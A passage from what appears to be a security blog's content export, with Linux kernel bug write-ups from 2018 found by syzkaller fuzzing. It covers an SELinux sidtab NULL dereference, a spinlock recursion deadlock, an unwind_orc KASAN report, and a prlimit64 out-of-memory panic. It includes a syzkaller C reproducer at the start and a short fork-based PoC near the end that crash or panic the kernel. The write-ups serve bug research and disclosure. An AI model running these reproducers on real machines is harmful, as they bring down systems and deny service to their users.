counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop()\n{\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\tflush_tun();\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nuint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};\nvoid test()\n{\n\tlong res;memcpy((void*)0x20000280, \"/dev/loop-control\", 18);\n\tsyscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);\n\t*(uint64_t*)0x20000180 = 0;\n\t*(uint64_t*)0x20000188 = 0;\n\t*(uint64_t*)0x20000190 = 0;\n\t*(uint64_t*)0x20000198 = 0;\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000180, 0);\n\t*(uint64_t*)0x20000500 = 0x77359400;\n\t*(uint64_t*)0x20000508 = 0;\n\t*(uint64_t*)0x20000510 = 0;\n\t*(uint64_t*)0x20000518 = 0x989680;\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);\n\tres = syz_open_pts(-1, 0x42100);\n\tif (res != -1)\n\t\tr[0] = res;\n\tsyscall(__NR_ioctl, r[0], 0x5462, 0x20000140);\n\tsyscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);\n\tres = syscall(__NR_pipe2, 0x20000000, 0);\n\tif (res != -1) {\n\tr[1] = *(uint32_t*)0x20000000;\n\tr[2] = *(uint32_t*)0x20000004;\n\t}\n\t*(uint16_t*)0x20000040 = -1;\n\t*(uint16_t*)0x20000042 = 0x200;\n\t*(uint16_t*)0x20000044 = 0x8000;\n\t*(uint16_t*)0x20000046 = 0x3f;\n\t*(uint16_t*)0x20000048 = 0x22;\n\t*(uint16_t*)0x2000004a = 0x45f;\n\tsyscall(__NR_ioctl, r[1], 0x560a, 0x20000040);\n\tsyscall(__NR_fstatfs, r[1], 0x200000c0);\n\tsyz_open_pts(r[2], 0);\n\t*(uint32_t*)0x20000340 = 0x10;\n\tsyscall(__NR_accept, r[2], 0x20000300, 0x20000340);\n\tsyscall(__NR_fcntl, r[2], 4, 0x40400);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (;;) {\n\t\tif (chdir(cwd))\n\t\t\tfail(\"failed to chdir\");\n\t\tuse_temporary_dir();\n\t\tinitialize_tun();\n\t\tinitialize_netdevices();\n\t\tloop();\n\t}\n}\n```\n\n**End**\n\n","excerpt":"getsockopt - task hung in lock_sock_nested Posting in a long time :) because of other stuff. I have a few LK bugs but skip it :). I just fo…","fields":{"slug":"/2018-02-Founds/"},"frontmatter":{"date":"Feb 14, 2018","title":"Linux Kernel - 2018-02 Founds","tags":["Security","Linux-Kernel"],"update":"Feb 24, 2018"},"timeToRead":34}},{"node":{"rawMarkdownBody":"\n## selinux/sidtab_search_core - null dereference by GPF\n\nI got this bug with 'syzkaller' about a month ago (on v4.15.0-rc4) and have forgotten it, but now on v4.15.0-rc8, the same bug is triggered by my POC code, so I wrote about it :).\n\nFirst of all, from the conclusion, it is **(practically?), not critical**. Because, nowadays, null dereference isn't worked anymore unless expanding minimum virtual memory limitation.\n\nSo, I analyze this bug only to a certain extent, not trying to make full exploit code. (Strictly saying that of course, any info leaks are needed to complete this exp.)\n\n### Bug\n\nThe bug type is NULL dereference (at 0x0000000000000008). Caused by GPF (General Page Fault). To explain, when GPF occurs, the address the program attempted to access is stored in the CR2 register.\nFirst, let's see the log.\n\n```c\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000008\nIP: sidtab_search_core+0x2d/0x100 security/selinux/ss/sidtab.c:88\nPGD 800000007de20067 P4D 800000007de20067 PUD 71211067 PMD 0 \nOops: 0000 [#1] SMP PTI\nDumping ftrace buffer:\n   (ftrace buffer empty)\nModules linked in:\nCPU: 2 PID: 9230 Comm: syz-executor4 Not tainted 4.15.0-rc8-tsan #12\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\nRIP: 0010:sidtab_search_core+0x2d/0x100 security/selinux/ss/sidtab.c:88\nRSP: 0018:ffffafff40abfd40 EFLAGS: 00010202\nRAX: 0000000000000001 RBX: ffffffffbc8eef60 RCX: ffffffff8145f964\nRDX: 0000000000000122 RSI: ffffafff410a1000 RDI: ffffffffbc8eef60\nRBP: ffff9c3cfcc86a60 R08: 0000000000000001 R09: 0000000000000006\nR10: ffffafff40abfcf0 R11: 6bcc1da06bf0e4e5 R12: 0000000000000001\nR13: 0000000000000000 R14: 0000000000000000 R15: ffff9c3cfe044e40\nFS:  00007ffb4e6d5700(0000) GS:ffff9c3cffc00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000000000008 CR3: 000000007131a000 CR4: 00000000000006e0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nCall Trace:\n security_bounded_transition+0x2d/0x1b0 security/selinux/ss/services.c:873\n selinux_setprocattr+0x37e/0x480 security/selinux/hooks.c:6042\n security_setprocattr+0x4f/0x70 security/security.c:1264\n proc_pid_attr_write+0x107/0x140 fs/proc/base.c:2545\n __vfs_write+0x40/0x1c0 fs/read_write.c:480\n vfs_write+0xe1/0x210 fs/read_write.c:544\n SYSC_write fs/read_write.c:589 [inline]\n SyS_write+0x50/0xc0 fs/read_write.c:581\n entry_SYSCALL_64_fastpath+0x25/0x9c\nRIP: 0033:0x452a39\nRSP: 002b:00007ffb4e6d4c58 EFLAGS: 00000212\nCode: 41 55 41 89 d6 41 54 55 41 89 f4 53 48 89 fb e8 1a 40 d0 ff 48 85 db 0f 84 8e 00 00 00 e8 0c 40 d0 ff 4c 8b 2b 44 89 e0 83 e0 7f <49> 8b 5c c5 00 48 85 db 74 28 e8 f4 3f d0 ff 8b 2b 41 39 ec 77 \nRIP: sidtab_search_core+0x2d/0x100 security/selinux/ss/sidtab.c:88 RSP: ffffafff40abfd40\nCR2: 0000000000000008\n---[ end trace fcdce066308f120e ]---\nKernel panic - not syncing: Fatal exception\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x38a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\nAnd first thing to do is to look the **Call Trace** so that we can notice where the crash is happened.\nIn this case, RIP is at security/selinux/ss/sidtab.c:88 and last call trace is in security/selinux/ss/services.c:873.\n\n```c\nint security_bounded_transition(u32 old_sid, u32 new_sid)\n{\n\tstruct context *old_context, *new_context;\n\tstruct type_datum *type;\n\tint index;\n\tint rc;\n\n\tread_lock(&policy_rwlock);\n\n\trc = -EINVAL;\n\told_context = sidtab_search(&sidtab, old_sid);  // called\n\t...\n\nstatic struct context *sidtab_search_core(struct sidtab *s, u32 sid, int force)\n{\n\tint hvalue;\n\tstruct sidtab_node *cur;\n\n\tif (!s)\n\t\treturn NULL;\n\n\thvalue = SIDTAB_HASH(sid);\n\tcur = s->htable[hvalue];     // line 88 // here \n\twhile (cur && sid > cur->sid)\n\t\tcur = cur->next;\n\n\tif (force && cur && sid == cur->sid && cur->context.len)\n\t\treturn &cur->context;\n\n\tif (!cur || sid != cur->sid || cur->context.len) {\n\t\t/* Remap invalid SIDs to the unlabeled SID. */\n\t\tsid = SECINITSID_UNLABELED;\n\t\thvalue = SIDTAB_HASH(sid);\n\t\tcur = s->htable[hvalue];\n\t\twhile (cur && sid > cur->sid)\n\t\t\tcur = cur->next;\n\t\tif (!cur || sid != cur->sid)\n\t\t\treturn NULL;\n\t}\n\n\treturn &cur->context;\n}\n```\n\nwe can't know all about why it is crashed and what/where the bad pointer is only with above info.\nAbd because of KASAN, KASAN triggers before the PF, tries to access the **shadow memory** for the bad pointer.\n\nThen, let's have a look at the code. Using pwntools, we can easily disassemble it.\n```python\nfrom pwn import *\n\n\nbytecodes = \"41 55 41 89 d6 41 54 55 41 89 f4 53 48 89 fb e8 1a 40 d0 ff 48 85 db 0f 84 8e 00 00 00 e8 0c 40 d0 ff 4c 8b 2b 44 89 e0 83 e0 7f 49 8b 5c c5 00 48 85 db 74 28 e8 f4 3f d0 ff 8b 2b 41 39 ec 77\".replace(' ', '').decode('hex')\n\nres = disasm(bytecodes, arch='amd64', os='linux')\n\nprint(res)\n```\n\nthe result is...\n\n```c\n   0:   41 55                   push   r13 \n   2:   41 89 d6                mov    r14d,edx\n   5:   41 54                   push   r12\n   7:   55                      push   rbp\n   8:   41 89 f4                mov    r12d,esi\n   b:   53                      push   rbx ; rbx is s (struct sidtab *)\n   c:   48 89 fb                mov    rbx,rdi\n   f:   e8 1a 40 d0 ff          call   0xffffffffffd0402e\n  14:   48 85 db                test   rbx,rbx\n  17:   0f 84 8e 00 00 00       je     0xab ; maybe the end of function\n  1d:   e8 0c 40 d0 ff          call   0xffffffffffd0402e\n  22:   4c 8b 2b                mov    r13,QWORD PTR [rbx] ; s = *s\n  25:   44 89 e0                mov    eax,r12d ; r12d is sid, 1\n  28:   83 e0 7f                and    eax,0x7f ; sid &= 0x7f       ; hvalue = SIDTAB_HASH(sid)\n  2b:  *49 8b 5c c5 00          mov    rbx,QWORD PTR [r13+rax*8+0x0]; cur = s->htable[hvalue] \n  30:   48 85 db                test   rbx,rbx\n  33:   74 28                   je     0x5d\n  35:   e8 f4 3f d0 ff          call   0xffffffffffd0402e\n  3a:   8b 2b                   mov    ebp,DWORD PTR [rbx]\n  3c:   41 39 ec                cmp    r12d,ebp\n  3f:   77                      .byte 0x77\n```\n\nAs following, at line 2b, moving *(r13 + rax * 8 + 0x0) to rbx. r13 is 0, rax is 1, then r13 + rax * 8 + 0x0 = 8.\nWhich means NULL dereference (at 0x8) is confirmed.\n\nLet's see structure...\n\n```c\nstruct sidtab {\n\tstruct sidtab_node * *     htable;               /*     0     8 */\n\tunsigned int               nel;                  /*     8     4 */\n\tunsigned int               next_sid;             /*    12     4 */\n\tunsigned char              shutdown;             /*    16     1 */\n\n\t/* XXX 7 bytes hole, try to pack */\n\n\tstruct sidtab_node *       cache[3];             /*    24    24 */\n\tspinlock_t                 lock;                 /*    48    56 */\n\t/* --- cacheline 1 boundary (64 bytes) was 40 bytes ago --- */\n\n\t/* size: 104, cachelines: 2, members: 6 */\n\t/* sum members: 97, holes: 1, sum holes: 7 */\n\t/* last cacheline: 40 bytes */\n};\n\nstruct sidtab_node {\n\tu32                        sid;                  /*     0     4 */\n\n\t/* XXX 4 bytes hole, try to pack */\n\n\tstruct context             context;              /*     8    72 */\n\t/* --- cacheline 1 boundary (64 bytes) was 16 bytes ago --- */\n\tstruct sidtab_node *       next;                 /*    80     8 */\n\n\t/* size: 88, cachelines: 2, members: 3 */\n\t/* sum members: 84, holes: 1, sum holes: 4 */\n\t/* last cacheline: 24 bytes */\n};\n```\n```c\n\tcur = s->htable[hvalue];     // line 88 // here \n```\n\nthen, we found where the problem is. Then, how could it be fixed? &s->htable (NULL) checking?\n\n==============\n\nMy analyze is end here! more requires a few effort :0....\nOf course, i have PoC code reproducible, but i'll not upload it! :|\n\n**END**\n","excerpt":"selinux/sidtab_search_core - null dereference by GPF I got this bug with 'syzkaller' about a month ago (on v4.15.0-rc4) and have forgotten …","fields":{"slug":"/2018-01-Founds/"},"frontmatter":{"date":"Jan 18, 2018","title":"Linux Kernel - 2018-01 Founds","tags":["Security","Linux-Kernel"],"update":"Jan 18, 2018"},"timeToRead":6}},{"node":{"rawMarkdownBody":"\n## spin-lock recursion bug (leading to deadlock)\n\nThere's no recursion check on spinlock where I found it (not exact). So when executed recursively, deadlock is triggered.\nIt needs to check current and calling thread id so that avoiding deadlock at recursive cases.\n\nBelow is pseudo-code for the patch.\n```c\n# spinlock - lock\n\n...\nlong recursiveLockCount = 0;\n...\n\nif(ownThreadId == calledThreadId) {\n\t++recursiveLockCount;\n\tassert(recursiveLockCount > 0);\n\treturn;\n}\n...\n\n# spinlock - unlock\n\n...\nif(recursiveLockCount) {\n\tassert(ownThreadId == calledThreadId);\n\t--recursiveLockCount;\n\treturn;\n}\n...\n```\n\n### Call Trace (Dump)\n```c\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x104/0x1c5 lib/dump_stack.c:53\n spin_bug kernel/locking/spinlock_debug.c:75 [inline]\n debug_spin_lock_before kernel/locking/spinlock_debug.c:84 [inline]\n do_raw_spin_lock+0x18c/0x1d0 kernel/locking/spinlock_debug.c:112\n rq_lock kernel/sched/sched.h:1766 [inline]\n ttwu_queue kernel/sched/core.c:1863 [inline]\n try_to_wake_up+0x98e/0x14e0 kernel/sched/core.c:2078\n wake_up_worker kernel/workqueue.c:839 [inline]\n insert_work+0x384/0x4d0 kernel/workqueue.c:1312\n __queue_work+0x537/0x1160 kernel/workqueue.c:1462\n queue_work_on+0x8f/0xa0 kernel/workqueue.c:1487\n queue_work include/linux/workqueue.h:488 [inline]\n call_usermodehelper_exec+0x2a7/0x470 kernel/umh.c:439\n call_modprobe kernel/kmod.c:99 [inline]\n __request_module+0x3ff/0xc00 kernel/kmod.c:171\n inet6_create+0xc56/0x1200 net/ipv6/af_inet6.c:156\n __sock_create+0x4c8/0x810 net/socket.c:1265\n sock_create net/socket.c:1305 [inline]\n SYSC_socket net/socket.c:1335 [inline]\n SyS_socket+0xdb/0x190 net/socket.c:1315\n entry_SYSCALL_64_fastpath+0x1f/0x96\nRIP: 0033:0x4565b9\nRSP: 002b:00007f85ab8b2bd8 EFLAGS: 00000216 ORIG_RAX: 0000000000000029\nRAX: ffffffffffffffda RBX: 00007f85ab8b3700 RCX: 00000000004565b9\nRDX: 0000000000000004 RSI: 0000000000000800 RDI: 000000000000000a\nRBP: 00007ffc612e5ac0 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000216 R12: 00007ffc612e5a3e\nR13: 00007ffc612e5a3f R14: 00007f85ab8b3700 R15: 00007f85ab8b39c0\n```\n\n## unwind_orc - stack out-of-bound\n\n* Read 8 bytes stack oob in unwind_next_frame\n\nI just found the bug stack OOB (8 bytes read) in unwind_orc. So, I just tested it on the latest LK (v4.15.0-rc4 currently),\nand it worked. But, I found the commit about this bug(?).\nHe (Commiter) said...\n\n> \"The ORC unwinder got confused by some kprobes changes, which isn't\nsurprising since the runtime code no longer matches vmlinux, and the\nstack was modified for kretprobes. <br />\nUntil we have a way for generated code to register changes with the\nunwinder, these types of warnings are inevitable.  So just disable KASAN\nchecks for stack accesses in the ORC unwinder.\"\n\nAlso, you can see it [here](https://github.com/torvalds/linux/commit/881125bfe65bb772f34f4fcb04a35dfe117e186a)\nIt was found & patched at LK v4.14.0-rc8 on 2017/11/8.\n\nIn short, it is intended! not a BUG. In addition, if it is a bug, it just a kinda memory disclosure useless :|.\n\n### Before & After\n```c\n@@ -279,7 +279,7 @@ static bool deref_stack_reg(struct unwind_state *state, unsigned long addr,\n \tif (!stack_access_ok(state, addr, sizeof(long)))\n \t\treturn false;\n \n-\t*val = READ_ONCE_TASK_STACK(state->task, *(unsigned long *)addr);\n+\t*val = READ_ONCE_NOCHECK(*(unsigned long *)addr);\n \treturn true;\n }\n \n```\n\nsee the difference? yes, READ_ONCE_TASK_STACK to READ_ONCE_NOCHECK.\n\n### Call Trace (Dump)\n```c\nBUG: KASAN: stack-out-of-bounds in deref_stack_regs arch/x86/kernel/unwind_orc.c:302 [inline]\nBUG: KASAN: stack-out-of-bounds in unwind_next_frame+0x15a6/0x1e60 arch/x86/kernel/unwind_orc.c:438\nRead of size 8 at addr ffff8800762674f0 by task syz-executor3/2870\n\nCPU: 2 PID: 2870 Comm: syz-executor3 Not tainted 4.15.0-rc3+ #3\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x104/0x1cd lib/dump_stack.c:53\n print_address_description+0x60/0x224 mm/kasan/report.c:252\n kasan_report_error mm/kasan/report.c:351 [inline]\n kasan_report+0x16b/0x260 mm/kasan/report.c:409\n\nThe buggy address belongs to the page:\npage:00000000f387e2cc count:0 mapcount:0 mapping:          (null) index:0x0\nflags: 0x500000000000000()\nraw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff\nraw: ffffea0001d899e0 ffffea0001d899e0 0000000000000000 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff880076267380: f2 f2 f2 f2 f2 f2 00 f2 f2 f2 f2 f2 f2 f2 00 00\n ffff880076267400: f2 f2 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00\n>ffff880076267480: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1\n                                                             ^\n ffff880076267500: f1 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2\n ffff880076267580: f2 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2\n==================================================================\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 2 PID: 2870 Comm: syz-executor3 Tainted: G    B            4.15.0-rc3+ #3\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0x104/0x1cd lib/dump_stack.c:53\n panic+0x1aa/0x39b kernel/panic.c:183\n kasan_end_report+0x43/0x49 mm/kasan/report.c:176\n kasan_report_error mm/kasan/report.c:356 [inline]\n kasan_report.cold.5+0xb5/0xe1 mm/kasan/report.c:409\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x15000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n## prlimit64 (leading to kernel panic)\n\nW4F, not serious :).\n\nI just found a crash on LK v4.15.x (maybe the most of LKs). It has to happen.\nBecause, resizing limitation of MSGQUEUE to **0** and calling socket$xxx repeatedly, as result, occurs OOM (out of memory).\n\n### PoC\n> gcc -o poc -std=c99 poc.c\n\n```c\n#define _GNU_SOURCE \n\n#include <unistd.h>\n\n#include <sys/types.h>\n#include <sys/syscall.h>\n\nstatic void test();\n\nvoid loop() {\n\twhile (1) test();\n}\n\nvoid test() {\n\tsyscall(__NR_mmap, 0x20000000, 0x9000, 0x3, 0x32, -1, 0);  // just space\n\tsyscall(__NR_prlimit64, 0x0, 0x7, 0x20000000, 0x20000000); // 0x7 => RLIMIT_MSGQUEUE\n\tsyscall(__NR_socket, 0x2, 0x1, 0x0);                       // socket$inet_tcp\n}\n\nvoid main(int argc, char *argv[], char **envp) {\n\tfor (int i = 0; i < 8; ++i) {\n\t\tint pid = fork();\n\t\tif (pid == 0) {\n\t\t\tloop();\n\t\t\treturn;\n\t\t}\n\t}\n\n\tsleep(1000000); // wait\n}\n```\n\n### Call Trace (Dump)\n```c\n[   61.885712] CPU: 1 PID: 1 Comm: init Not tainted 4.15.0-rc4+ #4\n[   61.885987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\n[   61.886426] Call Trace:\n[   61.886553]  dump_stack+0x104/0x1cd\n[   61.886723]  ? _atomic_dec_and_lock+0x153/0x153\n[   61.886945]  panic+0x1aa/0x39b\n[   61.887095]  ? add_taint.cold.3+0x16/0x16\n[   61.887291]  ? blocking_notifier_call_chain+0xc5/0x160\n[   61.887533]  ? srcu_init_notifier_head+0x80/0x80\n[   61.887752]  ? rcutorture_record_progress+0x10/0x10\n[   61.887981]  ? save_trace+0x2f0/0x2f0\n[   61.888170]  out_of_memory.cold.38+0x1e/0x64\n[   61.888378]  ? oom_killer_disable+0x2c0/0x2c0\n[   61.888604]  ? mutex_trylock+0x1fe/0x260\n[   61.888791]  ? __alloc_pages_slowpath+0x119d/0x29c0\n[   61.889023]  ? 